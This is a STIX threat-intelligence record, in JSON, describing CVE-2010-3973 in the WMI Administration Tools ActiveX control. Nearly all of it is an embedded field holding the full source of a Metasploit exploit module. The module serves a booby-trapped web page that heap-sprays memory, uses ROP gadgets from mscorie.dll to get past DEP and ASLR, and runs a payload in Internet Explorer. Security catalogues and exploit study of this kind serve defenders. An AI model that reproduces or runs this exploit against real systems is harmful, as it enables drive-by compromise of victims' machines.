{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dfaa22d0-6b7d-4084-805b-36be582e6052",
    "created": "2024-08-14T16:42:51.878778Z",
    "modified": "2024-08-14T16:42:51.878783Z",
    "name": "Microsoft WMI Administration Tools ActiveX Buffer Overflow",
    "description": " This module exploits a memory trust issue in the Microsoft WMI Administration tools ActiveX control. When processing a specially crafted HTML page, the WEBSingleView.ocx ActiveX Control (1.50.1131.0) will treat the 'lCtxHandle' parameter to the 'AddContextRef' and 'ReleaseContext' methods as a trusted pointer. It makes an indirect call via this pointer which leads to arbitrary code execution.  This exploit utilizes a combination of heap spraying and the .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not opt-in to ASLR. As such, this module should be reliable on all Windows versions.  The WMI Administrative Tools are a standalone download & install (linked in the references).   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/wmi_admintools.rb",
            "external_id": "wmi_admintools.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3973"
        },
        {
            "source_name": "reference",
            "url": "http://wooyun.org/bug.php?action=view&id=1006"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20101228043011/http://secunia.com:80/advisories/42693"
        },
        {
            "source_name": "reference",
            "url": "http://www.microsoft.com/downloads/en/details.aspx?FamilyID=6430f853-1120-48db-8cc5-f2abdc3ed314"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :rank       => NormalRanking,\n  #  :vuln_test  => nil,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft WMI Administration Tools ActiveX Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a memory trust issue in the Microsoft WMI\n        Administration tools ActiveX control. When processing a specially crafted\n        HTML page, the WEBSingleView.ocx ActiveX Control (1.50.1131.0) will treat\n        the 'lCtxHandle' parameter to the 'AddContextRef' and 'ReleaseContext' methods\n        as a trusted pointer. It makes an indirect call via this pointer which leads\n        to arbitrary code execution.\n\n        This exploit utilizes a combination of heap spraying and the\n        .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not\n        opt-in to ASLR. As such, this module should be reliable on all Windows\n        versions.\n\n        The WMI Administrative Tools are a standalone download & install (linked in the\n        references).\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'WooYun', 'MC', 'jduck' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '69942'],\n          [ 'CVE', '2010-3973' ],\n          [ 'BID', '45546' ],\n          [ 'URL', 'http://wooyun.org/bug.php?action=view&id=1006' ],\n          [ 'URL', 'http://web.archive.org/web/20101228043011/http://secunia.com:80/advisories/42693' ],\n          [ 'URL', 'http://www.microsoft.com/downloads/en/details.aspx?FamilyID=6430f853-1120-48db-8cc5-f2abdc3ed314' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 512,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Windows Universal',  { 'SprayTarget' => 0x105ae020 } ],\n          [ 'Debug Target (Crash)', { 'SprayTarget' => 0x70707070 } ] # must be < 0x80000000\n        ],\n      'DisclosureDate' => '2010-12-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def auto_target(cli, request)\n    mytarget = nil\n\n    agent = request.headers['User-Agent']\n    if agent =~ /MSIE 6\\.0/ or agent =~ /MSIE 7\\.0/ or agent =~ /MSIE 8\\.0/\n      mytarget = targets[1]\n    else\n      print_error(\"Unknown User-Agent #{agent}\")\n    end\n    mytarget\n  end\n\n  def on_request_uri(cli, request)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    if request.uri == get_resource() or request.uri =~ /\\/$/\n      print_status(\"Sending redirect (target: #{mytarget.name})...\")\n\n      redir = get_resource()\n      redir << '/' if redir[-1,1] != '/'\n      redir << rand_text_alphanumeric(4+rand(4))\n      redir << '.html'\n      send_redirect(cli, redir)\n\n    elsif request.uri =~ /\\.html?$/\n      # Re-generate the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      print_status(\"Sending HTML (target: #{mytarget.name})...\")\n\n      # Generate the ROP payload\n      buf_addr = mytarget['SprayTarget']\n      rvas = rvas_mscorie_v2()\n      rop_stack = generate_rop(buf_addr, rvas)\n\n      fix_esp = rva2addr(rvas, 'pop ebp / ret')\n      pivot1  = rva2addr(rvas, 'call [ecx+4] / xor eax, eax / pop ebp / ret 8')\n      pivot2  = rva2addr(rvas, 'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret')\n\n      pivot_str = Rex::Text.to_unescape([pivot1].pack('V'))\n\n      special_sauce = [\n        buf_addr + 0x10,\n        pivot2, # becomes eip via trusted ptr\n        fix_esp,\n        0xdeadbeef,\n        pivot1, # used by AddContextRef\n        pivot1  # used by ReleaseContext\n      ].pack('V*')\n\n      # Append the payload to the rop_stack\n      rop_stack << p.encoded\n\n      # Add in the rest of the ROP stack\n      special_sauce << rop_stack\n\n      special_sauce = Rex::Text.to_unescape(special_sauce)\n      shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n      nops      = Rex::Text.to_unescape(make_nops(4))\n      js_function  = rand_text_alpha(rand(32)+1)\n      vname  = rand_text_alpha(rand(32) + 1)\n\n      clsid = \"2745E5F5-D234-11D0-847A-00C04FD7BB08\"\n      progid = \"WBEM.SingleViewCtrl.1\"\n\n      method_names = [\n        \"AddContextRef\",\n        \"ReleaseContext\"\n      ]\n\n      method_name = method_names[rand(method_names.length)]\n\n      # Construct the heap spray javascript\n      custom_js = <<-EOS\nfunction #{js_function}() {\nheap = new heapLib.ie(0x20000);\nvar heapspray = unescape(\"#{special_sauce}\");\nwhile(heapspray.length < 0x1000) heapspray += unescape(\"%u4444\");\nvar heapblock = heapspray;\nwhile(heapblock.length < 0x40000) heapblock += heapblock;\nfinalspray = heapblock.substring(2, 0x40000 - 0x21);\nfor(var counter = 0; counter < 500; counter++) { heap.alloc(finalspray); }\n#{vname}.#{method_name}(#{\"0x%x\" % buf_addr});\n}\nEOS\n      js = heaplib(custom_js)\n\n      dll_uri = get_resource()\n      dll_uri << '/' if dll_uri[-1,1] != '/'\n      dll_uri << \"generic-\" + Time.now.to_i.to_s + \".dll\"\n\n      # Construct the final page\n      content = <<-EOS\n<html>\n<head>\n<script language='javascript'>\n#{js}\n</script>\n</head>\n<body onload='#{js_function}()'>\n<object classid=\"#{dll_uri}#GenericControl\" />\n<object classid=\"clsid:#{clsid}\" id=\"#{vname}\"></object>\n</body>\n</html>\nEOS\n\n      # Transmit the response to the client\n      send_response_html(cli, content)\n\n    elsif request.uri =~ /\\.dll$/\n      print_status(\"Sending DLL (target: #{mytarget.name})...\")\n\n      # Generate a .NET v2.0 DLL, note that it doesn't really matter what this contains since we don't actually\n      # use it's contents ...\n      ibase = (0x2000 | rand(0x8000)) << 16\n      dll = Msf::Util::EXE.to_dotnetmem(ibase, rand_text(16))\n\n      # Send a .NET v2.0 DLL down\n      send_response(cli, dll,\n        {\n          'Content-Type' => 'application/x-msdownload',\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        })\n    end\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def rvas_mscorie_v2()\n    # mscorie.dll version v2.0.50727.3053\n    # Just return this hash\n    {\n      'call [ecx+4] / xor eax, eax / pop ebp / ret 8' => 0x237e,\n      'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret' => 0x575b,\n      'pop ebp / ret'          => 0x5557,\n      'call [ecx] / pop ebp / ret 0xc' => 0x1ec4,\n      'pop eax / ret'          => 0x5ba1,\n      'pop ebx / ret'          => 0x54c0,\n      'pop ecx / ret'          => 0x1e13,\n      'pop esi / ret'          => 0x1d9a,\n      'pop edi / ret'          => 0x2212,\n      'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc' => 0x61f6,\n      'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret' => 0x6154,\n    }\n  end\n\n  def generate_rop(buf_addr, rvas)\n    # ROP fun! (XP SP3 English, Dec 15 2010)\n    rvas.merge!({\n      # Instructions / Name    => RVA\n      'BaseAddress'            => 0x63f00000,\n      'imp_VirtualAlloc'       => 0x10f4\n    })\n\n    rop_stack = [\n      # Allocate an RWX memory segment\n      'pop ecx / ret',\n      'imp_VirtualAlloc',\n\n      'call [ecx] / pop ebp / ret 0xc',\n      0,         # lpAddress\n      0x1000,    # dwSize\n      0x3000,    # flAllocationType\n      0x40,      # flProt\n      :unused,\n\n      # Copy the original payload\n      'pop ecx / ret',\n      :unused,\n      :unused,\n      :unused,\n      :memcpy_dst,\n\n      'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc',\n      :unused,\n\n      'pop esi / ret',\n      :unused,\n      :unused,\n      :unused,\n      :memcpy_src,\n\n      'pop edi / ret',\n      0xdeadf00d # to be filled in above\n    ]\n    (0x200 / 4).times {\n      rop_stack << 'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret'\n    }\n    # Execute the payload ;)\n    rop_stack << 'call [ecx] / pop ebp / ret 0xc'\n\n    rop_stack.map! { |e|\n      if e.kind_of? String\n        # Meta-replace (RVA)\n        fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{e}\\\"\") if not rvas[e]\n        rvas['BaseAddress'] + rvas[e]\n\n      elsif e == :unused\n        # Randomize\n        rand_text(4).unpack('V').first\n\n      elsif e == :memcpy_src\n        # Based on stack length..\n        buf_addr + 0x18 + (rop_stack.length * 4)\n\n      elsif e == :memcpy_dst\n        # Store our new memory ptr into our buffer for later popping :)\n        buf_addr + 0x18 + (21 * 4)\n\n      else\n        # Literal\n        e\n      end\n    }\n\n    rop_stack.pack('V*')\n  end\n\n  def rva2addr(rvas, key)\n    fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{key}\\\"\") if not rvas[key]\n    rvas['BaseAddress'] + rvas[key]\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-21",
    "x_mitre_platforms": [
        "win'"
    ]
}